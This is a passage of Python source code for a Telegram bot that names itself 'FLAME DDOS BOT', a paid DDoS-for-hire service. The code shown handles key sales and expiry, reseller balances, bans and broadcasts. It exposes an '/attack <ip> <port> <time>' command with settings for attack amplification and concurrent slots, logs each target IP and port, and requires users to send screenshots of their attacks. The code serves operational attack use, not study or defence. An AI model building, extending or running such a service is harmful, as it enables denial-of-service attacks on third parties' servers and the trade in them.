            'created_by': user_id,
            'created_by_username': reseller_username,
            'created_by_type': 'reseller_trail',
            'used': False,
            'used_by': None,
            'used_at': None,
            'max_users': max_users,
            'current_users': 0,
            'is_trail': True,
            'reseller_id': reseller_id
        }
        
        keys_collection.insert_one(key_doc)
        
        try:
            bot.send_message(reseller_id, f"🎁 Reseller Trail Key Received!\n\n🔑 Key: `{key}`\n⏰ Duration: {hours} hours\n👥 Max Users: {max_users}\n\nShare this key with your customers!", parse_mode="Markdown")
            sent_count += 1
        except:
            pass
    
    safe_send_message(message.chat.id, f"✅ Reseller Trail Keys Sent!\n\n👥 Total Resellers: {len(resellers)}\n📨 Successfully Sent: {sent_count}\n⏰ Duration: {hours} hours", reply_to=message)

@bot.message_handler(commands=["del_trail", "detrail"])
def delete_trail_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) == 1:
        safe_send_message(message.chat.id, "⚠️ Do you really want to delete all trail keys?\n\nTo confirm, use `/del_trail confirm`.", reply_to=message)
        return
        
    if command_parts[1].lower() == "confirm":
        result = keys_collection.delete_many({'is_trail': True})
        safe_send_message(message.chat.id, f"✅ {result.deleted_count} trail keys have been deleted!", reply_to=message)
    else:
        safe_send_message(message.chat.id, "❌ Confirmation failed! Use `/del_trail confirm`.", reply_to=message)

@bot.message_handler(commands=["del_exp_key", "delexpkey"])
def del_exp_key_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    all_used_keys = list(keys_collection.find({'used': True}))
    expired_keys = []
    
    for key in all_used_keys:
        user = users_collection.find_one({'key': key['key']})
        if user:
            if not user.get('key_expiry') or user['key_expiry'] <= datetime.now():
                expired_keys.append(key)
        else:
            expired_keys.append(key)
    
    if not expired_keys:
        safe_send_message(message.chat.id, "✅ No expired keys found!", reply_to=message)
        return
    
    pending_del_exp_key = {}
    pending_del_exp_key[user_id] = expired_keys
    
    safe_send_message(message.chat.id, f"⚠️ Found {len(expired_keys)} expired keys!\n\nType /confirm_del_exp_key to confirm.", reply_to=message)

@bot.message_handler(commands=["confirm_del_exp_key"])
def confirm_del_exp_key_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    if user_id not in pending_del_exp_key:
        safe_send_message(message.chat.id, "❌ First use /del_exp_key!", reply_to=message)
        return
    
    expired_keys = pending_del_exp_key[user_id]
    del pending_del_exp_key[user_id]
    
    deleted_count = 0
    for key in expired_keys:
        try:
            keys_collection.delete_one({'key': key['key']})
            deleted_count += 1
        except:
            pass
    
    safe_send_message(message.chat.id, f"✅ {deleted_count} expired keys deleted!", reply_to=message)

@bot.message_handler(commands=["del_exp_usr", "delexpusr"])
def del_exp_usr_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    all_users = list(users_collection.find({'key': {'$ne': None}}))
    expired_users = []
    
    for user in all_users:
        if not user.get('key_expiry') or user['key_expiry'] <= datetime.now():
            expired_users.append(user)
    
    if not expired_users:
        safe_send_message(message.chat.id, "✅ No expired users found!", reply_to=message)
        return
    
    pending_del_exp = {}
    pending_del_exp[user_id] = expired_users
    
    safe_send_message(message.chat.id, f"⚠️ Found {len(expired_users)} expired users!\n\nType /confirm_del_exp to confirm.", reply_to=message)

@bot.message_handler(commands=["confirm_del_exp"])
def confirm_del_exp_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    if user_id not in pending_del_exp:
        safe_send_message(message.chat.id, "❌ First use /del_exp_usr!", reply_to=message)
        return
    
    expired_users = pending_del_exp[user_id]
    del pending_del_exp[user_id]
    
    deleted_count = 0
    for user in expired_users:
        try:
            users_collection.delete_one({'user_id': user['user_id']})
            deleted_count += 1
        except:
            pass
    
    safe_send_message(message.chat.id, f"✅ {deleted_count} expired users deleted!", reply_to=message)

@bot.message_handler(commands=["extend"])
def extend_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /extend <id or @username> <time>", reply_to=message)
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    duration_str = command_parts[2].lower()
    duration, duration_label = parse_duration(duration_str)
    
    if not duration:
        safe_send_message(message.chat.id, "❌ Invalid duration!", reply_to=message)
        return
    
    user = users_collection.find_one({'user_id': target_user_id})
    
    if not user:
        safe_send_message(message.chat.id, "❌ User not found in key database!", reply_to=message)
        return
    
    if user.get('key_expiry') and user['key_expiry'] > datetime.now():
        new_expiry = user['key_expiry'] + duration
    else:
        new_expiry = datetime.now() + duration
    
    users_collection.update_one(
        {'user_id': target_user_id},
        {'$set': {'key_expiry': new_expiry}}
    )
    
    new_remaining = format_timedelta(new_expiry - datetime.now())
    
    try:
        bot.send_message(target_user_id, f"🎉 Time Extended!\n\n⏰ Added: {duration_label}\n⏳ Total Time: {new_remaining}\n\nEnjoy!")
    except:
        pass
    
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    safe_send_message(message.chat.id, f"✅ Time Extended!\n\n👤 User: {display}\n🆔 ID: {target_user_id}\n⏰ Added: {duration_label}\n⏳ New Time: {new_remaining}", reply_to=message)

@bot.message_handler(commands=["extend_all", "extendall"])
def extend_all_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /extend_all <time>", reply_to=message)
        return
    
    duration_str = command_parts[1].lower()
    duration, duration_label = parse_duration(duration_str)
    
    if not duration:
        safe_send_message(message.chat.id, "❌ Invalid duration!", reply_to=message)
        return
    
    all_users = list(users_collection.find({'key': {'$ne': None}}))
    
    if not all_users:
        safe_send_message(message.chat.id, "❌ No users with keys found!", reply_to=message)
        return
    
    extended_count = 0
    notified_count = 0
    
    for user in all_users:
        uid = user['user_id']
        old_expiry = user.get('key_expiry')
        
        if old_expiry and old_expiry > datetime.now():
            new_expiry = old_expiry + duration
        else:
            new_expiry = datetime.now() + duration
            
        users_collection.update_one(
            {'user_id': uid},
            {'$set': {'key_expiry': new_expiry}}
        )
        extended_count += 1
        
        try:
            bot.send_message(uid, f"🎉 Time Extended for ALL Users!\n\n⏰ Added: {duration_label}\n\nEnjoy!")
            notified_count += 1
        except:
            pass
            
    safe_send_message(message.chat.id, f"✅ Done! Everyone's time has been extended.\n\n👤 Total Users: {extended_count}\n📨 Notified: {notified_count}\n⏰ Added: {duration_label}", reply_to=message)

@bot.message_handler(commands=["down"])
def down_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /down <id or @username> <time>", reply_to=message)
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    duration_str = command_parts[2].lower()
    duration, duration_label = parse_duration(duration_str)
    
    if not duration:
        safe_send_message(message.chat.id, "❌ Invalid duration!", reply_to=message)
        return
    
    user = users_collection.find_one({'user_id': target_user_id})
    
    if not user:
        safe_send_message(message.chat.id, "❌ User not found in key database!", reply_to=message)
        return
    
    if not user.get('key_expiry') or user['key_expiry'] <= datetime.now():
        safe_send_message(message.chat.id, "❌ User does not have an active key!", reply_to=message)
        return
    
    new_expiry = user['key_expiry'] - duration
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    
    if new_expiry <= datetime.now():
        users_collection.update_one(
            {'user_id': target_user_id},
            {'$set': {'key': None, 'key_expiry': None}}
        )
        safe_send_message(message.chat.id, f"⚠️ Key Expired!\n\n👤 User: {display}\n🆔 ID: {target_user_id}\n❌ Key removed!", reply_to=message)
    else:
        users_collection.update_one(
            {'user_id': target_user_id},
            {'$set': {'key_expiry': new_expiry}}
        )
        new_remaining = format_timedelta(new_expiry - datetime.now())
        safe_send_message(message.chat.id, f"✅ Time Reduced!\n\n👤 User: {display}\n🆔 ID: {target_user_id}\n⏰ Reduced: {duration_label}\n⏳ New Time: {new_remaining}", reply_to=message)

@bot.message_handler(commands=["delkey"])
def delete_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /delkey <key>", reply_to=message)
        return
    
    key_input = command_parts[1]
    
    result = keys_collection.delete_one({'key': key_input})
    
    if result.deleted_count > 0:
        users_collection.update_one({'key': key_input}, {'$set': {'key': None, 'key_expiry': None}})
        safe_send_message(message.chat.id, f"✅ Key `{key_input}` deleted!", reply_to=message, parse_mode="Markdown")
    else:
        safe_send_message(message.chat.id, "❌ Key not found!", reply_to=message)

@bot.message_handler(commands=["key"])
def key_details_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /key <key>", reply_to=message)
        return
    
    key_input = command_parts[1]
    
    key_doc = keys_collection.find_one({'key': key_input})
    
    if not key_doc:
        safe_send_message(message.chat.id, "❌ Key not found!", reply_to=message)
        return
    
    response = "═══════════════════════════\n"
    response += "🔑 KEY DETAILS\n"
    response += "═══════════════════════════\n\n"
    
    response += f"🔑 Key: {key_input}\n"
    response += f"⏰ Duration: {key_doc.get('duration_label', 'Unknown')}\n"
    response += f"⏱️ Seconds: {key_doc.get('duration_seconds', 0)}\n"
    response += f"📅 Created: {key_doc.get('created_at', 'Unknown')}\n"
    
    creator_type = key_doc.get('created_by_type', 'owner')
    if creator_type == 'reseller':
        creator = key_doc.get('created_by_username', str(key_doc.get('created_by', 'Unknown')))
        response += f"👤 Creator: {creator} (Reseller)\n"
    else:
        response += f"👤 Creator: OWNER\n"
    
    response += f"\n📊 Status: {'🔴 USED' if key_doc.get('used') else '🟢 UNUSED'}\n"
    
    if key_doc.get('used'):
        response += f"👤 Used By: {key_doc.get('used_by', 'Unknown')}\n"
        response += f"📅 Used At: {key_doc.get('used_at', 'Unknown')}\n"
        
        user = users_collection.find_one({'key': key_input})
        if user:
            response += f"\n─── USER INFO ───\n"
            response += f"👤 Username: {user.get('username', 'Unknown')}\n"
            response += f"🆔 User ID: {user.get('user_id', 'Unknown')}\n"
            
            expiry = user.get('key_expiry')
            if expiry:
                if expiry > datetime.now():
                    remaining = format_timedelta(expiry - datetime.now())
                    response += f"⏳ Remaining: {remaining}\n"
                    response += f"✅ Status: ACTIVE\n"
                else:
                    response += f"❌ Status: EXPIRED\n"
    
    response += "\n═══════════════════════════"
    
    safe_send_message(message.chat.id, response, reply_to=message)

@bot.message_handler(commands=["allkeys"])
def list_keys_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    unused_keys = list(keys_collection.find({'used': False}))
    used_keys = list(keys_collection.find({'used': True}).sort('used_at', -1))
    
    content = "═══════════════════════════\n"
    content += "       ALL KEYS REPORT\n"
    content += f"    Generated: {datetime.now().strftime('%d-%m-%Y %H:%M')}\n"
    content += "═══════════════════════════\n\n"
    
    content += f"🟢 UNUSED KEYS ({len(unused_keys)})\n"
    content += "───────────────────────────\n"
    for i, key in enumerate(unused_keys[:50], 1):
        content += f"{i}. {key['key']}\n"
        content += f"   Duration: {key.get('duration_label', 'N/A')}\n"
        content += f"   Created: {key.get('created_at', 'N/A')}\n"
        if key.get('created_by_username'):
            content += f"   By: {key.get('created_by_username')}\n"
        content += "\n"
    
    content += f"\n🔴 USED KEYS ({len(used_keys)})\n"
    content += "───────────────────────────\n"
    for i, key in enumerate(used_keys[:50], 1):
        content += f"{i}. {key['key']}\n"
        content += f"   Duration: {key.get('duration_label', 'N/A')}\n"
        content += f"   Used by: {key.get('used_by', 'N/A')}\n"
        if key.get('used_at'):
            content += f"   Used at: {key['used_at'].strftime('%d-%m-%Y %H:%M')}\n"
        if key.get('created_by_username'):
            content += f"   Created by: {key.get('created_by_username')}\n"
        content += "\n"
    
    content += "\n═══════════════════════════\n"
    content += f"TOTAL: {len(unused_keys)} unused | {len(used_keys)} used\n"
    content += "═══════════════════════════"
    
    import io
    file = io.BytesIO(content.encode('utf-8'))
    file.name = f"all_keys_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    
    bot.send_document(message.chat.id, file, caption=f"📋 All Keys Report\n\n🟢 Unused: {len(unused_keys)}\n🔴 Used: {len(used_keys)}")

@bot.message_handler(commands=["allusers"])
def all_users_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    all_users = list(users_collection.find({'key': {'$ne': None}}).sort('key_expiry', -1))
    
    if not all_users:
        safe_send_message(message.chat.id, "📋 No users found!", reply_to=message)
        return
    
    active_users = []
    expired_users = []
    
    for user in all_users:
        if user.get('key_expiry') and user['key_expiry'] > datetime.now():
            active_users.append(user)
        else:
            expired_users.append(user)
    
    content = "═══════════════════════════\n"
    content += "       ALL USERS REPORT\n"
    content += f"    Generated: {datetime.now().strftime('%d-%m-%Y %H:%M')}\n"
    content += "═══════════════════════════\n\n"
    
    content += f"🟢 ACTIVE USERS ({len(active_users)})\n"
    content += "───────────────────────────\n"
    
    for i, user in enumerate(active_users[:50], 1):
        remaining = user['key_expiry'] - datetime.now()
        days = remaining.days
        hours, remainder = divmod(remaining.seconds, 3600)
        minutes, _ = divmod(remainder, 60)
        time_str = f"{days}d {hours}h {minutes}m"
        
        attack_count = attack_logs_collection.count_documents({'user_id': user['user_id']})
        
        content += f"{i}. {user.get('username', 'Unknown')}\n"
        content += f"   ID: {user['user_id']}\n"
        content += f"   Key: {user.get('key', 'N/A')}\n"
        content += f"   Duration: {user.get('key_duration_label', 'N/A')}\n"
        content += f"   Time Left: {time_str}\n"
        content += f"   Expires: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\n"
        content += f"   Total Attacks: {attack_count}\n"
        if user.get('reseller_username'):
            content += f"   Reseller: @{user['reseller_username']}\n"
        content += "\n"
    
    content += f"\n🔴 EXPIRED USERS ({len(expired_users)})\n"
    content += "───────────────────────────\n"
    
    for i, user in enumerate(expired_users[:50], 1):
        attack_count = attack_logs_collection.count_documents({'user_id': user['user_id']})
        content += f"{i}. {user.get('username', 'Unknown')}\n"
        content += f"   ID: {user['user_id']}\n"
        content += f"   Key: {user.get('key', 'N/A')}\n"
        if user.get('key_expiry'):
            content += f"   Expired: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\n"
        content += f"   Total Attacks: {attack_count}\n"
        content += "\n"
    
    content += "\n═══════════════════════════\n"
    content += f"TOTAL: {len(active_users)} Active | {len(expired_users)} Expired\n"
    content += "═══════════════════════════"
    
    import io
    file = io.BytesIO(content.encode('utf-8'))
    file.name = f"all_users_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    
    bot.send_document(message.chat.id, file, caption=f"👥 All Users Report\n\n🟢 Active: {len(active_users)}\n🔴 Expired: {len(expired_users)}")

@bot.message_handler(commands=["user"])
def user_info_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /user <id or @username>", reply_to=message)
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    user = users_collection.find_one({'user_id': target_user_id})
    reseller = resellers_collection.find_one({'user_id': target_user_id})
    bot_user = bot_users_collection.find_one({'user_id': target_user_id})
    
    response = "═══════════════════════════\n"
    response += "👤 USER INFORMATION\n"
    response += "═══════════════════════════\n\n"
    
    response += f"🆔 ID: <code>{target_user_id}</code>\n"
    if resolved_name:
        response += f"📛 Username: @{resolved_name}\n"
    
    if bot_user:
        if bot_user.get('first_name'):
            response += f"👤 Name: {bot_user.get('first_name')}\n"
        if bot_user.get('first_seen'):
            response += f"📅 First Seen: {bot_user['first_seen'].strftime('%d-%m-%Y %H:%M')}\n"
    
    if target_user_id == BOT_OWNER:
        response += "\n👑 Role: OWNER\n"
    elif reseller:
        response += f"\n💼 Role: RESELLER\n"
        response += f"💰 Balance: {reseller.get('balance', 0)} Rs\n"
        response += f"🔑 Keys Generated: {reseller.get('total_keys_generated', 0)}\n"
        if reseller.get('blocked'):
            response += "🚫 Status: BLOCKED\n"
        else:
            response += "✅ Status: ACTIVE\n"
        if reseller.get('added_at'):
            response += f"📅 Added: {reseller['added_at'].strftime('%d-%m-%Y')}\n"
    else:
        response += "\n👤 Role: USER\n"
    
    if user:
        response += "\n═══════════════════════════\n"
        response += "🔑 KEY DETAILS\n"
        response += "═══════════════════════════\n\n"
        
        if user.get('banned'):
            response += "🚫 STATUS: BANNED\n"
            if user.get('banned_at'):
                response += f"📅 Banned At: {user['banned_at'].strftime('%d-%m-%Y %H:%M')}\n"
        
        if user.get('key'):
            response += f"🔑 Key: <code>{user['key']}</code>\n"
            response += f"⏰ Duration: {user.get('key_duration_label', 'N/A')}\n"
            
            if user.get('redeemed_at'):
                response += f"📅 Redeemed: {user['redeemed_at'].strftime('%d-%m-%Y %H:%M')}\n"
            
            if user.get('key_expiry'):
                if user['key_expiry'] > datetime.now():
                    remaining = user['key_expiry'] - datetime.now()
                    days = remaining.days
                    hours, rem = divmod(remaining.seconds, 3600)
                    mins, secs = divmod(rem, 60)
                    response += f"⏳ Remaining: {days}d {hours}h {mins}m\n"
                    response += f"📆 Expires: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\n"
                    response += "✅ Status: ACTIVE\n"
                else:
                    response += f"📆 Expired: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\n"
                    response += "❌ Status: EXPIRED\n"
            
            if user.get('reseller_username'):
                response += f"💼 Reseller: @{user['reseller_username']}\n"
        else:
            response += "❌ No Active Key\n"
    else:
        response += "\n❌ No Key History\n"
    
    user_keys = list(keys_collection.find({'used_by': target_user_id}).sort('used_at', -1).limit(5))
    if user_keys:
        response += "\n═══════════════════════════\n"
        response += "📜 KEY HISTORY (Last 5)\n"
        response += "═══════════════════════════\n\n"
        for k in user_keys:
            response += f"• {k.get('duration_label', 'N/A')}"
            if k.get('used_at'):
                response += f" ({k['used_at'].strftime('%d-%m-%Y')})"
            response += "\n"
    
    attack_count = attack_logs_collection.count_documents({'user_id': target_user_id})
    user_attacks = list(attack_logs_collection.find({'user_id': target_user_id}).sort('timestamp', -1).limit(10))
    
    response += "\n═══════════════════════════\n"
    response += "⚔️ ATTACK STATS\n"
    response += "═══════════════════════════\n\n"
    response += f"📊 Total Attacks: {attack_count}\n"
    
    if user_attacks:
        response += "\n📜 Recent Attacks:\n"
        for i, atk in enumerate(user_attacks[:5], 1):
            response += f"{i}. {atk['target']}:{atk['port']} ({atk['duration']}s)\n"
            if atk.get('timestamp'):
                response += f"   📅 {atk['timestamp'].strftime('%d-%m-%Y %H:%M')}\n"
    
    response += "\n═══════════════════════════"
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["ban"])
def ban_user_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /ban <id or @username>", reply_to=message)
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    if target_user_id == BOT_OWNER:
        safe_send_message(message.chat.id, "❌ Cannot ban the owner!", reply_to=message)
        return
    
    users_collection.update_one(
        {'user_id': target_user_id},
        {'$set': {'user_id': target_user_id, 'username': resolved_name, 'banned': True, 'banned_at': datetime.now()}},
        upsert=True
    )
    
    try:
        bot.send_message(target_user_id, "🚫 You have been banned!")
    except:
        pass
    
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    safe_send_message(message.chat.id, f"✅ User {display} banned!\n🆔 ID: {target_user_id}", reply_to=message)

@bot.message_handler(commands=["unban"])
def unban_user_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /unban <id or @username>", reply_to=message)
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    result = users_collection.update_one(
        {'user_id': target_user_id},
        {'$set': {'banned': False}}
    )
    
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    if result.modified_count > 0:
        try:
            bot.send_message(target_user_id, "✅ Your ban has been lifted!")
        except:
            pass
        safe_send_message(message.chat.id, f"✅ User {display} unbanned!\n🆔 ID: {target_user_id}", reply_to=message)
    else:
        safe_send_message(message.chat.id, "❌ User not found or already unbanned!", reply_to=message)

@bot.message_handler(commands=["banned"])
def list_banned_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    banned_users = list(users_collection.find({'banned': True}))
    
    if not banned_users:
        safe_send_message(message.chat.id, "📋 No banned users found!", reply_to=message)
        return
    
    response = "═══════════════════════════\n"
    response += "🚫 BANNED USERS\n"
    response += "═══════════════════════════\n\n"
    
    for i, user in enumerate(banned_users[:20], 1):
        response += f"{i}. 👤 `{user['user_id']}`\n"
        if user.get('username'):
            response += f"   📛 {user['username']}\n"
    
    response += f"\n═══════════════════════════\n"
    response += f"📊 Total Banned: {len(banned_users)}\n"
    response += "═══════════════════════════"
    
    send_long_message(message, response, parse_mode="Markdown")

@bot.message_handler(commands=["tban"])
def tban_user_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /tban <id or @username> <time>\nExample: /tban 123456 10m", reply_to=message)
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
        
    if target_user_id == BOT_OWNER:
        safe_send_message(message.chat.id, "❌ Cannot ban the owner!", reply_to=message)
        return
        
    duration_str = command_parts[2]
    duration_td, label = parse_duration(duration_str)
    
    if not duration_td:
        safe_send_message(message.chat.id, "❌ Invalid duration format! Use: 10m, 1h, 1d etc.", reply_to=message)
        return
        
    ban_expiry = datetime.now() + duration_td
    users_collection.update_one(
        {'user_id': target_user_id},
        {'$set': {'banned': True, 'ban_type': 'temporary', 'ban_expiry': ban_expiry}},
        upsert=True
    )
    
    safe_send_message(message.chat.id, f"🚫 User {resolved_name or target_user_id} has been banned for {label}!\n⏳ Expiry: {ban_expiry.strftime('%d-%m-%Y %H:%M:%S')}", reply_to=message)

@bot.message_handler(commands=["owner"])
def owner_settings_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        return
    
    busy_slots, free_slots, total_slots = get_slot_status()
    
    help_text = f'''
👑 **OWNER PANEL**

**⚙️ CURRENT SETTINGS:**
• Max Attack Time: {get_max_attack_time()}s
• Min Attack Time: {MIN_ATTACK_TIME}s
• Individual Cooldown: {get_user_cooldown_setting()}s
• Attack Amplification: {get_concurrent_limit()}x
• Max Concurrent Slots: {total_slots}
• Available Slots: {free_slots}/{total_slots}

🔑 **KEY MANAGEMENT:**
• /gen <time> <count> - Generate keys
• /key <key> - Key details
• /allkeys - All keys
• /delkey <key> - Delete key
• /del_exp_key - Delete expired keys
• /trail <hrs> <max> - Trail keys
• /reseller_trail <id> <hrs> - Give trail to reseller
• /del_trail - Delete all trail keys

👥 **USER MANAGEMENT:**
• /user <id> - User info
• /allusers - All users
• /extend <id> <time> - Extend time
• /extend_all <time> - Extend everyone's time
• /down <id> <time> - Reduce time
• /del_exp_usr - Delete expired users
• /ban <id> - Ban user
• /unban <id> - Unban user
• /banned - Banned users
• /tban <id> <time> - Temp ban

💼 **RESELLER MANAGEMENT:**
• /add_reseller <id> - Add reseller
• /remove_reseller <id> - Remove reseller
• /block_reseller <id> - Block
• /unblock_reseller <id> - Unblock
• /all_resellers - All resellers
• /saldo_add <id> <amt> - Add balance
• /saldo_remove <id> <amt> - Remove balance
• /saldo <id> - Check balance
• /user_resell <id> - Reseller's users
• /setprice - View/change pricing

📢 **BROADCAST:**
• /broadcast - Message to all
• /broadcast_reseller - Message to resellers
• /broadcast_paid - Message to paid users only

⚡ **ATTACK SETTINGS:**
• /attack <ip> <port> <time> - Attack (min 60s)
• /status - Attack status
• /max_attack <sec> - Set max attack time
• /cooldown <sec> - Set individual cooldown
• /concurrent <num> - Set attack amplification
• /max_concurrent <num> - Set max simultaneous users
• /block_ip <prefix> - Block IP
• /unblock_ip <prefix> - Unblock IP
• /blocked_ips - View blocked IPs
• /prot_on - Port Protection ON
• /prot_off - Port Protection OFF

📊 **MONITORING:**
• /live - Server stats
• /logs - Attack logs (txt file)
• /del_logs - Delete all logs

🔧 **MAINTENANCE:**
• /maintenance <msg> - Maintenance ON
• /ok - Maintenance OFF
'''
    
    safe_send_message(message.chat.id, help_text, reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=['help'])
def show_help(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    if is_owner(user_id):
        help_text = '''
👑 **Welcome Owner!**

Use `/owner` to access the full owner panel with all commands.

🔐 **Regular User Commands:**
• /id - View your ID
• /ping - Check bot status
• /redeem <key> - Redeem a key
• /mykey - View key details
• /status - View attack status
• /attack <ip> <port> <time> - Start an attack (min 60s)
'''
    elif is_reseller(user_id):
        help_text = '''
💼 **RESELLER PANEL**

🆔 **ID:**
• /id - View your ID
• /ping - Check bot status

💰 **BALANCE:**
• /mysaldo - Check your balance
• /prices - View key prices

🔑 **KEY GENERATION:**
• /gen <duration> <count> - Generate keys
  Durations: 12h, 1d, 3d, 7d, 30d, 60d

⚡ **ATTACK:**
• /redeem <key> - Redeem a key
• /attack <ip> <port> <time> - Attack (min 60s)
• /status - Attack status
• /mykey - Key details
'''
    else:
        help_text = '''
🔐 **COMMANDS:**
• /id - View your ID
• /ping - Check bot status
• /redeem <key> - Redeem a key
• /mykey - View key details
• /status - View attack status
• /attack <ip> <port> <time> - Start an attack (min 60s)

📸 **Note:** After each attack, you must send a screenshot as feedback before starting another attack.
'''
    
    safe_send_message(message.chat.id, help_text, reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    
    track_bot_user(user_id, message.from_user.username)
    if check_maintenance(message): return
    if check_banned(message): return
    
    if is_owner(user_id):
        response = f'''👑 Welcome Owner, {user_name}!

Use /owner to access the full owner panel.
Use /help to see basic commands.'''
    elif is_reseller(user_id):
        response = f'''💼 Welcome Reseller, {user_name}!

Use /help to see your commands.'''
    else:
        response = f'''👋 Welcome, {user_name}!

🔐 **Commands:**
• /redeem <key> - Redeem a key
• /mykey - View key details
• /status - View attack status
• /attack <ip> <port> <time> - Start an attack (min 60s)

📸 **Feedback Required:** After each attack, you must send a screenshot to continue.
'''
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")

@bot.message_handler(content_types=['photo'])
def handle_feedback_photo(message):
    user_id = message.from_user.id
    
    fb = get_pending_feedback(user_id)
    if not fb:
        return
    
    clear_pending_feedback(user_id)
    
    user_name = message.from_user.first_name
    username = message.from_user.username
    
    safe_send_message(message.chat.id, 
        "✅ **Feedback Received!**\n\n"
        "🎉 Thank you for your feedback!\n\n"
        "⚡ You can now start a new attack using /attack command.",
        reply_to=message, parse_mode="Markdown")
    
    try:
        owner_msg = (
            f"📸 **NEW ATTACK FEEDBACK**\n\n"
            f"👤 **User:** {user_name}\n"
            f"📛 **Username:** @{username if username else 'N/A'}\n"
            f"🆔 **ID:** `{user_id}`\n\n"
            f"🎯 **Target:** {fb['target']}:{fb['port']}\n"
            f"⏱️ **Duration:** {fb['duration']}s\n"
            f"🕐 **Time:** {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}"
        )
        
        bot.send_photo(
            BOT_OWNER, 
            message.photo[-1].file_id, 
            caption=owner_msg,
            parse_mode="Markdown"
        )
    except Exception as e:
        print(f"Failed to forward feedback to owner: {e}")

# ============ BOT START ============
print("=" * 60)
print("🔥 FLAME DDOS BOT STARTING...")
print("=" * 60)
print(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
print(f"💾 MongoDB: {MONGO_URL}")
print(f"🌐 FlareSolverr: {FLARESOLVERR_URL}")
